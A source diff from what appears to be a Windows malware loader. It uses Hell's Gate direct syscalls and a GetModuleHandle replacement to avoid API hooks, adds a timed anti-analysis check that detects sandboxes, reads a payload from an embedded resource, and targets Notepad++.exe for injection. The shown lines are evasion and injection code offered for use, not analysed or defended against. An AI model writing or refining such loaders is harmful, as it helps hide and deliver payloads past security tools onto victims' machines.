@@ -1,7 +1,7 @@
 #include "HellsGate.h"
 #include "Common.h"
 
-//#define TEST
+#define TEST
 
 #define LOCAL_INJECTION
 
@@ -9,25 +9,27 @@
 #define TARGET_PROCESS L"Notepad++.exe"
 #endif
 
+#define ANTI_ANALYSIS
+
 int main() {
 	// Init syscalls for use
 	InitializeSyscalls();
-
-	// Anti-analysis techniques
-	//DWORD	seconds = 5;
-	//DWORD	dwMilliseconds = seconds * 1000;
-	//if (AntiAnalysis(dwMilliseconds) == FALSE) {
-	//	printf("File Is Being Analyzed!\n");
-	//}
 #ifdef TEST
-
-	GetProcAddressReplacement(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");
-	
+	GetProcAddressReplacement(GetModuleHandleReplacement(L"NTDLL.dll"), "NtAllocateVirtualMemory");
 #else
 	PVOID pPayloadAddress = NULL;
 	SIZE_T sPayloadSize = 0;
 	DWORD dwPid = 0;
 	HANDLE hProcess = NULL;
+
+#ifdef ANTI_ANALYSIS
+	// Anti-analysis techniques
+	DWORD	seconds = 5;
+	DWORD	dwMilliseconds = seconds * 1000;
+	if (AntiAnalysis(dwMilliseconds) == FALSE) {
+		printf("File Is Being Analyzed!\n");
+	}
+#endif
 
 	// Resource reading
 	if (ReadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
@@ -60,6 +62,8 @@ int main() {
 		FALSE
 	);
 #endif
+
 #endif
+
 	return 0;
 }
